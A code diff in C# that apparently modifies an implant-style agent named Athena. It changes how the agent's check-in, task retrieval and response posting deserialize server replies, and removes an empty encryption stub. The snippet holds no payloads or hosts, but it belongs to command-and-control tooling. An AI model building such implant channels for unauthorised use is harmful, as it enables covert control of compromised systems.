@@ -25,21 +25,6 @@ namespace Athena
 
         public CheckinResponse CheckIn()
         {
-            if (Globals.encrypted)
-            {
-                //encrypt
-            }
-            /**
-            switch (Globals.profile)
-            {
-                case ProfileType.HTTP:
-                    break;
-                case ProfileType.Websocket:
-                    break;
-                case ProfileType.SMB:
-                    break;
-            }
-            **/
             Checkin ct = new Checkin()
             {
                 action = "checkin",
@@ -55,7 +40,8 @@ namespace Athena
             var responseString = Send(ct).Result;
             try
             {
-                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
+                
+                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(responseString);
                 return cs;
             }
             catch
@@ -76,8 +62,8 @@ namespace Athena
             {
 
                 var responseString = Send(gt).Result;
-                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
-                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
+                //GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
+                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(responseString);
                 return gtr.tasks;
             }
             catch
@@ -157,7 +143,8 @@ namespace Athena
             {
                 var responseString = Send(prr).Result;
                 Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
-                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString).Substring(36));
+                //PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString).Substring(36));
+                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString));
                 if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                 {
                     return false;
